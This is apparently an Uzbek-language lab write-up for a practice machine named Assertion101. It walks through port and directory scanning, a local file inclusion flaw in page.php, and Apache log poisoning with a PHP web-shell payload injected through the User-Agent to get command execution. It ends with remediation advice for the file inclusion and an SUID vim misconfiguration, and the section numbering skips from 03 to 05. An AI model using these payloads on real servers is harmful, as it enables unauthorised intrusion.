Razvedka (Reconnaissance) 01
Port skanerlash

Birinchi qadam — barcha portlarni skanerlash. -sC standart skriptlar, -sV versiya aniqlash uchun.

kali@kali nmap
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -p- --min-rate 5000 -oA nmap/assertion101 192.168.X.X
Nmap scan report for 192.168.X.X Host is up (0.089s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 80/tcp open http Apache httpd 2.4.41 |_http-title: Assertion101 |_http-server-header: Apache/2.4.41 (Ubuntu)
→ Faqat 22 va 80 port ochiq. SSH credential kerak, demak asosiy vektor — web.
Web razvedka

HTTP xizmatini gobuster bilan skanerlaymiz — yashirin direktoriyalarni topish uchun.

kali@kali gobuster
└─$ gobuster dir -u http://192.168.X.X -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 50
=============================================================== /index.php (Status: 200) /admin (Status: 301) /page.php (Status: 200) /config.php (Status: 403) ===============================================================

/page.php qiziq ko'rindi — ?file= parametri bilan ishlaydi ekan.

Zaiflikni Aniqlash 02
LFI tekshiruvi

page.php?file= parametri foydalanuvchi kiritmasini filtrsiz include() ga uzatmoqda. LFI mavjudligini tekshiramiz:

browser / curl
└─$ curl "http://192.168.X.X/page.php?file=../../../../etc/passwd"
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin john:x:1000:1000:john,,,:/home/john:/bin/bash
ℹ LFI tasdiqlandi. john foydalanuvchisi mavjud. /etc/shadow o'qib bo'lmaydi — boshqa vektor kerak.
Dastlabki Kirish (Initial Access) 03
Log Poisoning

Apache access log faylini o'qib ko'ramiz — agar LFI orqali log o'qilsa, PHP kodi inject qilish mumkin.

LFI orqali log tekshiruvi
└─$ curl "http://192.168.X.X/page.php?file=../../../../var/log/apache2/access.log"
192.168.X.X - - [15/Jan/2025] "GET / HTTP/1.1" 200 1234 "-" "Mozilla/5.0..."

Log o'qildi! Endi User-Agent orqali PHP payload yuboramiz:

PHP payload injection
└─$ curl -s "http://192.168.X.X/" -A "<?php system(\$_GET['cmd']); ?>"

RCE test
└─$ curl "http://192.168.X.X/page.php?file=../../../../var/log/apache2/access.log&cmd=id"

Zaiflik Tahlili va Tavsiyalar 05

Ushbu mashina ikki asosiy zaiflikni o'z ichiga olgan:

Zaifliklar jadvali
LFI (Local File Inclusion) Kritik Input validation yo'q — foydalanuvchi kiritmasini filtrlanmagan holda include() ga uzatilmoqda
SUID vim misconfiguration Yuqori vim.basic ga keraksiz SUID bit o'rnatilgan — root shell olish imkoni beradi
Tavsiyalar

LFI uchun: basename() yoki whitelist yondashuvini qo'llash. Foydalanuvchi kiritmasini hech qachon filtrsiz include() ga uzatmaslik.

SUID uchun: chmod u-s /usr/bin/vim.basic — SUID bitini olib tashlash. Muntazam SUID audit o'tkazish.
